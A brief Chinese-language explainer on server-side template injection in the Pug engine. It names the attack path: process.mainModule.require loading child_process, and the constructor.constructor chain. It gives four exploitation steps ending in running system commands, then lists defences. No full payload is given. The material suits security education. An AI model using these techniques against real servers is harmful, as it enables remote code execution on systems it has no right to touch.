**漏洞原理：** Pug SSTI通过未过滤的插值表达式(#{expression})或代码块(-/=前缀)执行JavaScript。攻击者可利用global.process.mainModule.require导入child_process模块，或通过constructor链(this.constructor.constructor)动态创建Function执行代码。

**利用方法：** 完整利用流程：
1. 探测模板注入点
2. 确认Pug引擎
3. 使用require加载child_process
4. 执行系统命令

**防御措施：** 防御措施：
1. 不要将用户输入直接渲染到模板
2. 禁用require访问
3. 使用沙箱环境
4. 输入验证和过滤

---
